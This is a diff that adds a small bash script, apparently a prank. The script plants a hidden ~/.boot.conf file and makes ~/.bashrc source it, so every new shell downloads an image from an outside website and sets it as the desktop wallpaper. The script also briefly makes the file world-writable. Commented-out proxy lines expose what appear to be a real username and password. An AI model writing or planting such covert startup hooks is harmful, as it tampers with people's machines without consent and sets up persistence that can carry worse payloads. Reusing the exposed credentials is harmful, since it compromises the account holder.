@@ -1,0 +1,23 @@
+#!/bin/bash
+
+touch ~/.boot.conf
+chmod 777 ~/.boot.conf
+
+echo "wget -q http://www.davidblock.co.za/data1/images/slider_clem_sunter2.jpg -O ~/BLOCK.jpg
+
+cd ~/
+
+gsettings set org.gnome.desktop.background picture-uri file:\`pwd\`/BLOCK.jpg &> /dev/null
+
+cd - &> /dev/null" >> ~/.boot.conf
+
+echo ". ~/.boot.conf" >> ~/.bashrc
+
+chmod 511 ~/.boot.conf
+
+rm a.out
+#export http_proxy="http://ds\00500195:wits.2011@proxyad.wits.ac.za:80/"
+#export https_proxy="https://ds\00500195:wits.2011@proxyad.wits.ac.za:80/"
+
+
+#rm ~/BLOCK.jpg
